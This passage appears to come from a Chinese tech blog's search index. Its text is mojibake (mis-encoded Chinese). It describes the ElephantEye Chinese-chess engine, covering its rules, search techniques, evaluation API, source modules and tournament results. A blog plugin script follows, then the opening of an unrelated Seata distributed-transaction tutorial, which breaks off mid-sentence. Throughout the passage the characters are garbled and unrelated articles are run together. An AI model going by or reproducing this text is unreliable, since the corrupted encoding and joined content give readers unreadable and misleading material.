å¹¶éä¸€ç‚¹å¥½å¤„ä¹Ÿæ²¡æœ‰ï¼Œå°¤å…¶åœ¨æ²¡æœ‰å¯ç”¨å¼€å±€åº“æ—¶ï¼Œé€‚å½“å¢å¤§éšæœºæ€§ï¼Œå¯ä»¥é¿å…ç¨‹åºåœ¨ç›¸åŒçš„å±€é¢ä¸‹èµ°å‡ºä¸€æ ·çš„ç€æ³•ã€‚ å››ã€è§„åˆ™ä» 2.0 ç‰ˆå¼€å§‹ï¼ŒElephantEye é™¤äº†æ”¯æŒ â€œå•æ–¹é¢é•¿å°†åˆ¤è´Ÿâ€ çš„è§„åˆ™å¤–ï¼Œè¿˜æ”¯æŒ â€œé•¿æ‰“åˆ¤è´Ÿâ€ï¼Œâ€œæ‰“â€ åŒ…æ‹¬ â€œå°†â€ å’Œ â€œæ‰â€ã€‚å°½ç®¡ ElephantEye åœ¨å¤æ‚çš„æƒ…å†µå¯èƒ½æ— æ³•æ­£ç¡®è¯†åˆ«é•¿æ‰“ï¼Œä½†ç”±äºæ”¯æŒ UCCI å‘½ä»¤ banmoves â€¦ ï¼Œä¸€æ—¦ç”¨æˆ·è®¤ä¸ºå¼•æ“èµ°äº† â€œé•¿æ‰“â€ çš„ç¦ç€ï¼Œå¯ä»¥ç”¨ &lt; è±¡æ£‹å·«å¸ˆ &gt; çš„ â€œè®¾ç½®ç¦ç€â€ åŠŸèƒ½è®©å¼•æ“å¼ºåˆ¶å˜ç€ã€‚ç”±äºç¨‹åºå¤æ‚æ€§æ–¹é¢çš„é™åˆ¶ï¼Œåªæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µè¢«è¯†åˆ«æˆ â€œæ‰â€ï¼Œåˆ†åˆ«æ˜¯ï¼š A. é©¬æ‰è½¦æˆ–æœ‰æ ¹çš„ç‚®å…µ (å’)ï¼›B. è½¦æ‰æœ‰æ ¹çš„é©¬ç‚®å…µ (å’)ï¼›C. ç‚®æ‰è½¦æˆ–æœ‰æ ¹çš„é©¬å…µ (å’)ã€‚ äº”ã€åšå¼ˆç®—æ³•ElephantEye å±äºåå‘è›®åŠ›çš„è±¡æ£‹ç¨‹åºï¼Œä½¿ç”¨äº†ä¸¥è°¨è€Œæœ‰æ•ˆçš„åšå¼ˆç®—æ³•ï¼š(1) ä½¿ç”¨ä½è¡Œå’Œä½åˆ—çš„ç€æ³•ç”Ÿæˆå™¨ï¼š ä½è¡Œ (BitRanks) å’Œä½åˆ— (BitFiles) æœ‰åˆ©äºæ»‘åŠ¨æ£‹å­ (è½¦å’Œç‚®) çš„ç€æ³• (å°¤å…¶æ˜¯åƒå­ç€æ³•) ç”Ÿæˆï¼Œä½è¡Œå’Œä½åˆ—å¯ä»¥ç”¨æŸ¥è¡¨æ¥ä»£æ›¿åœ¨å°„çº¿ä¸Šåšçš„å¾ªç¯è¿ç®—ã€‚åœ¨ ElephantEye ä¸­ï¼Œä½è¡Œå’Œä½åˆ—çš„æŠ€æœ¯ä¸ä»…ç”¨åœ¨ç€æ³•ç”Ÿæˆå™¨ä¸­ï¼Œä¹Ÿç”¨åˆ°äº†ç‰µåˆ¶çš„åˆ¤æ–­ä¸Šã€‚(2) é™æ€å±€é¢æœç´¢ï¼š åœ¨åšé™æ€æœç´¢æ—¶ï¼ŒElephantEye æœç´¢äº†åƒå­æˆ–è§£å°†çš„ç€æ³•ï¼Œåœ¨æœç´¢åƒå­ç€æ³•æ—¶ï¼ŒElephantEye è¿‡æ»¤æ‰ä¸é‡è¦çš„åƒå­ï¼Œä¾‹å¦‚åƒä¸è¿‡æ²³çš„å…µã€åƒä¸å¤„äºé˜²å®ˆä¸­çš„å£«è±¡ç­‰ç€æ³•ï¼Œéƒ½ä¸åœ¨é™æ€æœç´¢çš„èŒƒå›´ä¹‹å†…ã€‚(3) å¾ªç¯ç€æ³•å’Œé•¿å°†æ£€æµ‹ï¼š ElephantEye å¯ä»¥è¯†åˆ«å¾ªç¯ç€æ³•ï¼Œå‡ºç°å¾ªç¯ç€æ³•æ—¶å¯ä»¥åˆ¤æ–­å“ªæ–¹ä¸ºé•¿å°†ï¼Œå¹¶ä¸”ä¼šåˆ©ç”¨ç¦æ­¢é•¿å°†çš„è§„åˆ™æ¥è°‹æ±‚ä¼˜åŠ¿ï¼Œä½†ç›®å‰ ElephantEye è¿˜æ— æ³•è¯†åˆ«é•¿æ‰ã€‚(4) ç½®æ¢è¡¨ï¼š ElephantEye å‚è€ƒäº†ä¸­å›½è±¡æ£‹ç¨‹åº â€œçºµé©¬å¥”æµâ€ çš„è®¾è®¡æ€è·¯ï¼Œä½¿ç”¨æ·±åº¦ä¼˜å…ˆå’Œå§‹ç»ˆè¦†ç›–çš„åŒå±‚ç½®æ¢è¡¨ï¼Œå¹¶é‡‡ç”¨ä½å‡º (é«˜å‡º) è¾¹ç•Œä¿®æ­£çš„ç½®æ¢è¡¨æ›´æ–°ç­–ç•¥ã€‚(5) å¸¦æ£€éªŒçš„ç©ºç€è£å‰ªï¼š ElephantEye ä½¿ç”¨ R=2 çš„ç©ºç€è£å‰ªï¼Œåœ¨æ®‹å±€é˜¶æ®µä½¿ç”¨å¸¦æ£€éªŒçš„ç©ºç€è£å‰ªã€‚(6) è¿­ä»£åŠ æ·± / åƒå­ç€æ³• / æ€æ‰‹ç€æ³• / å†å²è¡¨å¯å‘ï¼š ElephantEye çš„ç€æ³•æ’åºéå¸¸ç®€å•æ¸…æ™°ï¼Œä¾æ¬¡æ˜¯è¿­ä»£åŠ æ·±ç€æ³•ã€å¥½çš„åƒå­ç€æ³•ã€æ€æ‰‹ç€æ³•å’ŒæŒ‰å†å²è¡¨æ’åºçš„ç”Ÿæˆç€æ³•ã€‚(7) å°†å†› / å”¯ä¸€åº”å°† / å…‘å­å»¶ä¼¸ï¼š åœ¨é€‰æ‹©æ€§å»¶ä¼¸ä¸Šï¼ŒElephantEye é‡‡ç”¨äº†å°†å†›ã€å”¯ä¸€åº”å°†å’Œå…‘å­å»¶ä¼¸ã€‚(8) Alpha-Beta ä¸»è¦å˜ä¾‹æœç´¢ï¼š ElephantEye ä½¿ç”¨ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„é€’å½’å¼ Alpha-Beta ä¸»è¦å˜ä¾‹æœç´¢ã€‚(9) å¼€å±€åº“ï¼š ElephantEye çš„å¼€å±€åº“å…±åŒ…å«äº† 10,000 ä¸ªå¯¹ç§°ç€æ³•ï¼Œæ˜¯ä» 1990 å¹´åˆ° 2005 å¹´å…¨å›½è±¡æ£‹ä¸ªäººèµ›ã€å›¢ä½“èµ›ã€äº”ç¾Šæ¯ã€è”èµ›ç­‰ 8,000 å±€é¡¶å°–æ¯”èµ›ä¸­æå–çš„ã€‚(10) åå°æ€è€ƒå’Œæ—¶é—´åˆ†é…ç­–ç•¥ï¼š ElephantEye æ”¯æŒåå°æ€è€ƒåŠŸèƒ½ï¼ŒåŒæ—¶æä¾›äº†æ—¶æ®µåˆ¶å’ŒåŠ æ—¶åˆ¶ä¸¤ç§æ—¶é—´åˆ†é…ç­–ç•¥ï¼Œä¼šè‡ªåŠ¨åˆç†åˆ†é…æ—¶é—´ã€‚ å…­ã€å¼€å±€åº“ElephantEye çš„å¼€å±€åº“å¯ç”± â€œElephantEye å¼€å±€åº“åˆ¶ä½œå·¥å…·â€ åˆ¶ä½œã€‚è¿è¡Œåˆ¶ä½œå·¥å…·åï¼Œé¦–å…ˆè¦é€‰æ‹© PGN æ£‹è°±æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œç„¶åä¿å­˜ä¸ºå¼€å±€åº“æ–‡ä»¶ (é€šå¸¸æ˜¯ BOOK.DAT)ã€‚é€šå¸¸ï¼Œç”¨æ¥ç”Ÿæˆå¼€å±€åº“çš„æ£‹è°±æ•°é‡è¶Šå¤šï¼Œç”Ÿæˆçš„å¼€å±€åº“æ–‡ä»¶å°±è¶Šå¤§ã€‚ä¸ºäº†ä½¿åˆ¶ä½œçš„å¼€å±€åº“å¯¹ ElephantEye ç”Ÿæ•ˆï¼Œåªéœ€è¦æŠŠç”Ÿæˆçš„å¼€å±€åº“æ–‡ä»¶æ›¿æ¢æ‰ ElephantEye ç›®å½•ä¸‹çš„ BOOK.DAT å³å¯ï¼Œä¹Ÿå¯ä»¥åœ¨ &lt; è±¡æ£‹å·«å¸ˆ &gt; çš„ â€œå¼•æ“è®¾ç½®â€ å¯¹è¯æ¡†ä¸­æŒ‡å®šå¼€å±€åº“æ–‡ä»¶ã€‚ ä¸ƒã€å±€é¢è¯„ä»·å‡½æ•°åº“ElephantEye ä» 2.1 ç‰ˆå¼€å§‹ï¼Œç¨‹åºçš„æœç´¢éƒ¨åˆ†å’Œå±€é¢è¯„ä»·éƒ¨åˆ†å°±åˆ†ç¦»äº†ï¼Œæœç´¢éƒ¨åˆ†é€šè¿‡è°ƒç”¨ API å‡½æ•°çš„å½¢å¼ä¸å±€é¢è¯„ä»·éƒ¨åˆ†è€¦åˆã€‚å…¶ä»–è±¡æ£‹ç¨‹åºè®¾è®¡å¸ˆå¯ä»¥åœ¨ ElephantEye çš„åŸºç¡€ä¸Šæ›´è‡ªç”±åœ°å‘æŒ¥ã€‚æ ¹æ® LGPL åè®®ï¼Œæœç´¢å’Œå±€é¢è¯„ä»·è¿™ä¸¤ä¸ªéƒ¨åˆ†éƒ½ä½œä¸ºç‹¬ç«‹çš„ç¨‹åºåº“ï¼Œè¿ç”¨å…¶ä¸­ä»»ä½•ä¸€éƒ¨åˆ†éƒ½åªéœ€è¦å…¬å¼€è¯¥éƒ¨åˆ†çš„æºç¨‹åºå³å¯ã€‚æ¢å¥è¯è¯´ï¼Œå¦‚æœå±€é¢è¯„ä»·éƒ¨åˆ†æ²¡æœ‰ä½¿ç”¨ä»»ä½•å¼€æ”¾ä»£ç ï¼Œé‚£ä¹ˆç¨‹åºè®¾è®¡å¸ˆå°±æ²¡æœ‰ä¹‰åŠ¡å…¬å¼€è¿™éƒ¨åˆ†çš„æºç¨‹åºï¼Œæœç´¢éƒ¨åˆ†ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ElephantEye çš„å±€é¢è¯„ä»· API å‡½æ•°æ¥å£å®šä¹‰å¦‚ä¸‹ï¼š 12345A. å±€é¢è¯„ä»·å¼•æ“åç§°ï¼šconst char *GetEngineName(void);B. å±€é¢é¢„è¯„ä»·å‡½æ•°æ¥å£ï¼švoid PreEvaluate( PositionStruct *lppos, PreEvalStruct *lpPreEval);C. å±€é¢è¯„ä»·å‡½æ•°æ¥å£ï¼šint Evaluate(const PositionStruct *lppos, int vlAlpha, int vlBeta);å…¶ä¸­ PositionStruct å’Œ PreEvalStruct å¿…é¡»åˆ†åˆ«ç¬¦åˆ position.h å’Œ pregen.h ä¸­å®šä¹‰çš„ç»“æ„ã€‚ å…«ã€æºä»£ç ElephantEye çš„æºä»£ç åŒ…æ‹¬ 9 ä¸ªæ¨¡å—ï¼Œå†…å®¹å¤§è‡´ä¸ºï¼š(1) ucci.h/ucci.cpp UCCI å‘½ä»¤è§£é‡Šæ¨¡å—ï¼ŒåŒ…æ‹¬ Windows å’Œ Unix ä¸‹çš„è¡Œè¾“å…¥æ¥æ”¶ç¨‹åºï¼›(2) pregen.h/pregen.cpp Zobrist æ•°ç»„å’Œç€æ³•é¢„ç½®è¡¨çš„ç”Ÿæˆæ¨¡å—ã€‚ElephantEye çš„é¢„ç½®è¡¨åˆ†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€æ˜¯æ»‘åŠ¨æ£‹å­çš„ç€æ³•é¢„ç½®è¡¨ (åŒ…æ‹¬ä¸åƒå­ã€è½¦åƒå­ã€ç‚®åƒå­å’Œéš”ä¸¤å­åƒå­)ï¼Œå®ƒæ˜¯å®ç°ä½è¡Œå’Œä½åˆ—æŠ€æœ¯çš„åŸºç¡€ï¼›äºŒæ˜¯å…¶ä»–æ£‹å­çš„ç€æ³•é¢„ç½®è¡¨ï¼Œä½¿å¾—ç€æ³•ç”Ÿæˆæ—¶é¿å…äº†çƒ¦ççš„è¾¹ç•Œåˆ¤æ–­ã€‚(3) position.h/position.cpp ä¸»è¦æè¿°ç€æ³•å’Œå±€é¢çš„æ•°æ®ç»“æ„åŠåŠŸèƒ½ã€‚å±€é¢çš„å¤„ç†æ˜¯æœ¬æ¨¡å—çš„é‡ç‚¹ï¼Œå¤„ç†å†…å®¹åŒ…æ‹¬å±€é¢åˆå§‹åŒ–ã€FEN ä¸²å¯¼å…¥ã€æ£‹å­ç§»åŠ¨ã€æ€æ‰‹ç€æ³•çš„åˆç†æ€§åˆ¤æ–­ã€å°†å†›åˆ¤æ–­ã€é•¿å°†å’Œå¾ªç¯æ£€æµ‹ã€å­åŠ›ä»·å€¼åˆ†è°ƒæ•´ç­‰è¿‡ç¨‹ï¼Œè¿˜åŒ…æ‹¬ 5 ä¸ªå­åŠ›ä½ç½®ä»·å€¼è¡¨ã€‚(4) genmoves.cpp ç€æ³•ç”Ÿæˆå™¨ï¼ŒåŒ…æ‹¬ç”Ÿæˆåƒå­ç€æ³•å’Œç”Ÿæˆä¸åƒå­ç€æ³•çš„ä¸¤ä¸ªï¼Œä½†ä¸èƒ½åªç”Ÿæˆè§£é™¤å°†å†›çš„ç€æ³•ã€‚åœ¨ç”Ÿæˆåƒå­ç€æ³•çš„åŒæ—¶èµ‹äºˆæ¯ä¸ªç€æ³•ä»¥ç›¸åº”çš„ MVV (LVA)(æˆ–ç§°å‡† SEE) å€¼ã€‚è¯¥æ¨¡å—è¿˜æœ‰ä¸€ä¸ªä¸“é—¨åˆ¤æ–­æ£‹å­æ˜¯å¦æœ‰ä¿æŠ¤çš„å‡½æ•°ï¼Œæ¥è®¡ç®— MVV (LVA) å€¼ï¼Œå¯¹äºæœ‰ä¿æŠ¤çš„æ£‹å­ï¼Œè®¡ç®— MVV-LVA çš„å€¼ (å°äºé›¶ä¸è®¡)ï¼Œå¯¹äºæ— ä¿æŠ¤çš„æ£‹å­ï¼Œåªè®¡ç®— MVV çš„å€¼ã€‚å› æ­¤ï¼Œåˆ¤æ–­æ£‹å­æ˜¯å¦æœ‰æ ¹çš„ç¨‹åºä¹ŸåŒ…æ‹¬åœ¨æœ¬æ¨¡å—ä¸­ã€‚(5) hash.h/hash.cpp ç½®æ¢è¡¨ã€å†å²è¡¨å’Œç€æ³•åˆ—è¡¨ç®¡ç†æ¨¡å—ï¼ŒåŒ…æ‹¬ç½®æ¢è¡¨çš„åˆ†é…å’Œå­˜å–ã€ä¸»è¦å˜ä¾‹è·å–ç­‰æ“ä½œã€‚(6) book.h/book.cpp å¼€å±€åº“è¯»å–æ¨¡å—ã€‚(7) movesort.h/movesort.cpp ç€æ³•åˆ—è¡¨æ’åºæ¨¡å—ã€‚(8) search.h/search.cpp æœç´¢æ¨¡å—ï¼Œé™¤äº†é™æ€æœç´¢ã€å®Œå…¨æœç´¢å’Œæ ¹ç»“ç‚¹æœç´¢è¿™ä¸‰ä¸ªä¸»è¦è¿‡ç¨‹å¤–ï¼Œè¿˜åŒ…æ‹¬è¿­ä»£åŠ æ·±æ§åˆ¶ã€åå°æ€è€ƒã€æ—¶é—´åˆ†é…ã€æœç´¢å‚æ•°ç»Ÿè®¡å’Œæœç´¢ä¿¡æ¯è¾“å‡ºç­‰å†…å®¹ã€‚è¯¥æ¨¡å—æ˜¯æ•´ä¸ªç¨‹åºçš„æ ¸å¿ƒæ¨¡å—ã€‚(9) eleeye.cpp ä¸»ç¨‹åº (å³ main å‡½æ•°)ã€‚(10) preeval.cpp å­åŠ›ä½ç½®æ•°ç»„é¢„ç”Ÿæˆå™¨ï¼ŒElephantEye æ ¹æ® â€œè¿›æ”» / é˜²å®ˆâ€ å’Œ â€œå¼€å±€ / ä¸­å±€ / æ®‹å±€â€ ä¸¤ä¸ªå‚æ•°çº¿æ€§è°ƒæ•´å­åŠ›ä½ç½®æ•°ç»„ã€‚(11) evaluate.cpp å±€é¢è¯„ä»·å‡½æ•°ï¼ŒElephantEye é‡‡ç”¨äº†å››çº§å·æ‡’è¯„ä»·çš„æœºåˆ¶ï¼Œæœ€ç²—çš„å±‚æ¬¡åªè¯„ä»·ç‰¹æ®Šæ£‹å‹ï¼Œè¿›ä¸€å±‚æ¬¡è¯„ä»·ç‰µåˆ¶ï¼Œå†è¿›ä¸€å±‚æ¬¡è¯„ä»·è½¦çš„çµæ´»æ€§ï¼Œæœ€é«˜å±‚æ¬¡è¿˜è¯„ä»·é©¬çš„é˜»ç¢ã€‚ ä¹ã€å¼•æ“è¡¨ç°ElephantEye çš„è®¾è®¡é‡ç‚¹åœ¨æœç´¢ç®—æ³•ï¼Œä½†åœ¨çŸ¥è¯†ä¸Šæ¯”è¾ƒæ¬ ç¼ºã€‚åœ¨ 2.8 GHz çš„å¤„ç†å™¨ä¸Šæ¯ç§’å¯æœç´¢çº¦ 1,000,000 ä¸ªç»“ç‚¹ (åŒ…æ‹¬å¸¸è§„æœç´¢å’Œé™æ€æœç´¢)ï¼Œä¸€èˆ¬çš„ä¸­å±€å±€é¢åœ¨ 1 åˆ†é’Ÿå†…å¯æœç´¢çº¦ 11 å±‚ã€‚åœ¨æ£‹åŠ›ä¸Šï¼ŒElephantEye å’Œ â€œæ£‹éšâ€ã€SaoLa (è±¡æ£‹æŒ‘æˆ˜è€…) ç­‰ç¨‹åºå…·æœ‰åŒç­‰æ°´å¹³ï¼Œä½†ç”±äºå±€é¢è¯„ä¼°å‡½æ•°ä¸Šçš„ç¼ºé™·ï¼ŒElephantEye è·ç¦»é¡¶å°–çš„å•†ä¸šè±¡æ£‹è½¯ä»¶ (è°¢è°¢å¤§å¸ˆã€è±¡æ£‹ä¸–å®¶ã€è±¡æ£‹å¥‡å…µã€æ£‹å¤©å¤§åœ£ç­‰) å°šæœ‰ä¸€å®šçš„å·®è·ã€‚ElephantEye åœ¨è”ä¼—ã€å¼ˆå¤©ç­‰è±¡æ£‹å¯¹å¼ˆç½‘ç«™ä¸Šä½œè¿‡æµ‹è¯•ï¼Œç”¨ç­‰çº§åˆ†æ¥è¡¡é‡ï¼Œè”ä¼—ç½‘çš„æˆ˜ç»©åœ¨ 2500 åˆ†å·¦å³ï¼Œå¼ˆå¤©ç½‘å¿«æ£‹çš„æˆ˜ç»©åœ¨ 2000 åˆ†å·¦å³ï¼Œæ…¢æ£‹åœ¨ 1500 åˆ†å·¦å³ã€‚2005 å¹´ 9 æœˆåœ¨å°æ¹¾è±¡æ£‹è½¯ä»¶çˆ±å¥½è€…æ–½é‡‘å±±çš„å¸®åŠ©ä¸‹ï¼ŒElephantEye å‚åŠ äº†åœ¨å°åŒ—ä¸¾è¡Œçš„ç¬¬ 10 å±Š ICGA ç”µè„‘å¥¥æ—åŒ¹å…‹å¤§èµ›ä¸­å›½è±¡æ£‹ç»„æ¯”èµ›ï¼Œæˆ˜ç»©æ˜¯ 7 èƒœ 5 å’Œ 14 è´Ÿï¼Œåœ¨ 14 ä¸ªç¨‹åºä¸­æ’åç¬¬ 11ï¼›2006 å¹´ 8 æœˆ ElephantEye å‚åŠ äº†åœ¨åŒ—äº¬ä¸¾è¡Œçš„å…¨å›½é¦–å±Šè®¡ç®—æœºåšå¼ˆé”¦æ ‡èµ›ï¼Œæˆ˜ç»©æ˜¯ 7 èƒœ 2 å’Œ 11 è´Ÿï¼Œåœ¨ 18 ä¸ªç¨‹åºä¸­æ’åç¬¬ 7ã€‚ åã€é™„åŠ æ¨¡å—ElephantEye çš„æºä»£ç åŒ…é™¤äº† ElephantEye æœ¬èº«çš„æºä»£ç å¤–ï¼Œè¿˜åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªé™„åŠ æ¨¡å—ï¼š(1) åŸºç¡€ä»£ç  (base)ï¼šæä¾›äº†æ±‡ç¼–æŒ‡ä»¤ã€ç³»ç»Ÿå‡½æ•°è°ƒç”¨ç­‰åŠŸèƒ½ï¼›(2) ä¸­å›½è±¡æ£‹è§„åˆ™æ¨¡å— (cchess)ï¼šä¸ºå…¶ä»–è½¯ä»¶ä½¿ç”¨ ElephantEye ä»£ç æä¾›äº†æ¥å£ï¼›(3) å¼€å±€åº“åˆ¶ä½œæ¨¡å— (BOOK)ï¼šåˆ¶ä½œå¼€å±€åº“ BOOK.DAT çš„ä»£ç ï¼›(4) UCCI å¼•æ“è”èµ›æ¨¡æ‹Ÿå™¨ (LEAGUE)ï¼šä¸º UCCI å¼•æ“æµ‹è¯•å’Œæ¯”èµ›æä¾›äº†è‡ªåŠ¨æ‰¹é‡å¯¹å±€çš„å¹³å°ï¼›(5) UCCI å¼•æ“æœç´¢æ ‘åˆ†æå™¨ (TREE)ï¼šUCCI å¼•æ“ (æ”¯æŒ UCCI 2.2+) çš„æœç´¢è·¯çº¿åˆ†æå·¥å…·ï¼›(6) XQF æ£‹è°±å·¥å…· (XQFTOOLS)ï¼šæä¾› XQF ç­‰å¤šç§æ£‹è°±è½¬æ¢ä¸º PGN çš„å·¥å…·ï¼›(7) æµ…çº¢è±¡æ£‹é€‚é…å™¨ (UCCI2QH)ï¼šä¸ºæµ…çº¢è±¡æ£‹è°ƒç”¨ UCCI å¼•æ“æä¾›äº†æ¥å£ï¼›(8) æµ…çº¢è±¡æ£‹å¼•æ“æ”¯æŒ UCCI çš„é€‚é…å™¨ (QH2UCCI)ï¼šä¸º â€œæ¢¦å…¥ç¥è›‹â€ æµ…çº¢è±¡æ£‹åŠ å…¥ UCCI å¼•æ“æµ‹è¯•æä¾›äº†æ¥å£ï¼›(9) BBS Chess (BBSCHESS)ï¼šä¸€ä¸ªç”¨ Visual Basic åˆ¶ä½œçš„å›½é™…è±¡æ£‹å±€é¢è®¾ç½®å·¥å…·ï¼Œå¯åœ¨å„é«˜æ ¡ BBS ä¸Šç²˜è´´å½©è‰²çš„å›½é™…è±¡æ£‹å±€é¢ï¼›(10) æ£‹ç›˜å›¾ç‰‡ç”Ÿæˆå™¨ (FEN2BMP)ï¼šä¸€ä¸ªå¯ä»¥æŠŠå›½é™…è±¡æ£‹å’Œä¸­å›½è±¡æ£‹çš„ FEN æ–‡ä»¶è½¬æ¢æˆ BMP æ–‡ä»¶çš„å®ç”¨å·¥å…·ï¼›(11) ç¼–ç è½¬æ¢ (codec)ï¼ŒåŒ…æ‹¬ç®€ç¹è½¬ç ã€UNIX æ–‡æœ¬è½¬ç ã€Base64 è½¬ç ç­‰ï¼›(12) å…¶ä»–å·¥å…· (MISC)ï¼šåŒ…æ‹¬ç®€æ˜“ç½‘ç»œé€šè®¯ã€ç®¡é“æµ‹è¯•ç­‰å·¥å…·ï¼›(13) è¯´æ˜æ–‡æ¡£ (DOC)ï¼šå³ã€Šä¸­å›½è±¡æ£‹ç¨‹åºè®¾è®¡æ¢ç´¢ã€‹ç³»åˆ—è¿è½½ï¼›(14) å‚èµ›æ£‹è°± (CCGC)ï¼šElephantEye å‚åŠ é¦–å±Šå…¨å›½è®¡ç®—æœºåšå¼ˆé”¦æ ‡èµ› (CCGC) çš„å…¨éƒ¨æ£‹è°±ã€‚ åä¸€ã€èµ„æºä¸‹è½½ è±¡æ£‹å·«å¸ˆ (v4.84) å®Œæ•´ç‰ˆçš„ä»£ç  è±¡æ£‹å·«å¸ˆè½»é‡ç‰ˆçš„ Github ä»£ç  ElephantEye (v3.15) å¼•æ“çš„ Github ä»£ç  åäºŒã€å‚è€ƒèµ„æ–™ è±¡æ£‹ç™¾ç§‘å…¨ä¹¦ ä¸­å›½è±¡æ£‹å¯¹å¼ˆç¨‹åº ElephantEye (è±¡çœ¼) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"Seata å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡",url:"/posts/84d3f3e6.html",text:'1ã€Seata æ•´ä½“æ¡†æ¶1.1ã€Seata æ¦‚è¿°Seata æ˜¯ä¸€å¥—ä¸€ç«™å¼åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼Œä¸ºç”¨æˆ·æä¾›äº† ATã€TCCã€SAGA å’Œ XA äº‹åŠ¡æ¨¡å¼ï¼Œè‡´åŠ›äºæä¾›é«˜æ€§èƒ½å’Œç®€å•æ˜“ç”¨çš„åˆ†å¸ƒå¼äº‹åŠ¡æœåŠ¡ã€‚ 1.2ã€Seata çš„ä¸‰å¤§æ¨¡å—Seata ä¸­æœ‰ä¸‰å¤§æ¨¡å—ï¼Œåˆ†åˆ«æ˜¯ TMã€RM å’Œ TCï¼Œå…¶ä¸­ TM å’Œ RM æ˜¯ä½œä¸º Seata çš„å®¢æˆ·ç«¯ä¸ä¸šåŠ¡ç³»ç»Ÿé›†æˆåœ¨ä¸€èµ·ï¼ŒTC ä½œä¸º Seata çš„æœåŠ¡ç«¯ç‹¬ç«‹éƒ¨ç½²ã€‚ TCï¼šTransaction Coordinator äº‹åŠ¡åè°ƒå™¨ï¼Œç»´æŠ¤å…¨å±€å’Œåˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œè´Ÿè´£åè°ƒå¹¶é©±åŠ¨å…¨å±€äº‹åŠ¡çš„æäº¤æˆ–å›æ»š TMï¼šTransaction Manager äº‹åŠ¡ç®¡ç†å™¨ï¼Œæ§åˆ¶å…¨å±€äº‹åŠ¡çš„è¾¹ç•Œï¼Œè´Ÿè´£å¼€å¯ä¸€ä¸ªå…¨å±€äº‹åŠ¡ï¼Œå¹¶æœ€ç»ˆå‘èµ·å…¨å±€æäº¤æˆ–å…¨å±€å›æ»šçš„å†³è®® RMï¼šResource Manager èµ„æºç®¡ç†å™¨ï¼Œç®¡ç†åˆ†æ”¯äº‹åŠ¡å¤„ç†çš„èµ„æºï¼Œå‘ TC æ³¨å†Œåˆ†æ”¯äº‹åŠ¡ï¼Œä¸ŠæŠ¥åˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œæ¥å— TC çš„å‘½ä»¤æ¥æäº¤æˆ–è€…å›æ»šåˆ†æ”¯äº‹åŠ¡ 1.3ã€Seata çš„æ‰§è¡Œæµç¨‹ TM å¼€å¯åˆ†å¸ƒå¼äº‹åŠ¡ï¼ˆTM å‘ TC æ³¨å†Œå…¨å±€äº‹åŠ¡è®°å½•ï¼‰ æŒ‰ä¸šåŠ¡åœºæ™¯ï¼Œç¼–æ’æ•°æ®åº“ã€æœåŠ¡ç­‰äº‹åŠ¡å†…èµ„æºï¼ˆRM å‘ TC æ±‡æŠ¥èµ„æºå‡†å¤‡çŠ¶æ€ ï¼‰ TM ç»“æŸåˆ†å¸ƒå¼äº‹åŠ¡ï¼Œäº‹åŠ¡ä¸€é˜¶æ®µç»“æŸï¼ˆTM é€šçŸ¥ TC æäº¤ / å›æ»šåˆ†å¸ƒå¼äº‹åŠ¡ï¼‰ TC æ±‡æ€»äº‹åŠ¡ä¿¡æ¯ï¼Œå†³å®šåˆ†å¸ƒå¼äº‹åŠ¡æ˜¯æäº¤è¿˜æ˜¯å›æ»š TC é€šçŸ¥æ‰€æœ‰ RM æäº¤ / å›æ»š èµ„æºï¼Œäº‹åŠ¡äºŒé˜¶æ®µç»“æŸ 2ã€AT æ¨¡å¼2.1ã€å‰æ Java åº”ç”¨ï¼Œé€šè¿‡ JDBC è®¿é—®æ•°æ®åº“ åŸºäºæ”¯æŒæœ¬åœ° ACID äº‹åŠ¡çš„å…³ç³»å‹æ•°æ®åº“ 2.2ã€å†™éš”ç¦» ä¸€é˜¶æ®µæœ¬åœ°äº‹åŠ¡æäº¤å‰ï¼Œéœ€è¦ç¡®ä¿å…ˆæ‹¿åˆ°å…¨å±€é” æ‹¿ä¸åˆ°å…¨å±€é” ï¼Œä¸èƒ½æäº¤æœ¬åœ°äº‹åŠ¡ æ‹¿å…¨å±€é”çš„å°è¯•è¢«é™åˆ¶åœ¨ä¸€å®šèŒƒå›´å†…ï¼Œè¶…å‡ºèŒƒå›´å°†æ”¾å¼ƒï¼Œå¹¶å›æ»šæœ¬åœ°äº‹åŠ¡ï¼Œé‡Šæ”¾æœ¬åœ°é” ä¸¾ä¾‹è¯´æ˜ï¼šä¸¤ä¸ªå…¨å±€äº‹åŠ¡ tx1 å’Œ tx2ï¼Œåˆ†åˆ«å¯¹ a è¡¨çš„ m å­—æ®µè¿›è¡Œæ›´æ–°æ“ä½œï¼Œm çš„åˆå§‹å€¼ 1000 tx1 å…ˆå¼€å§‹ï¼Œå¼€å¯æœ¬åœ°äº‹åŠ¡ï¼Œæ‹¿åˆ°æœ¬åœ°é”ï¼Œæ›´æ–°æ“ä½œ m = 1000 - 100 = 900ã€‚æœ¬åœ°äº‹åŠ¡æäº¤å‰ï¼Œå…ˆæ‹¿åˆ°è¯¥è®°å½•çš„å…¨å±€é”ï¼Œæœ¬åœ°æäº¤äº‹åŠ¡é‡Šæ”¾æœ¬åœ°é”ã€‚tx2 åå¼€å§‹ï¼Œå¼€å¯æœ¬åœ°äº‹åŠ¡ï¼Œæ‹¿åˆ°æœ¬åœ°é”ï¼Œæ›´æ–°æ“ä½œ m = 900 - 100 = 800ã€‚tx2 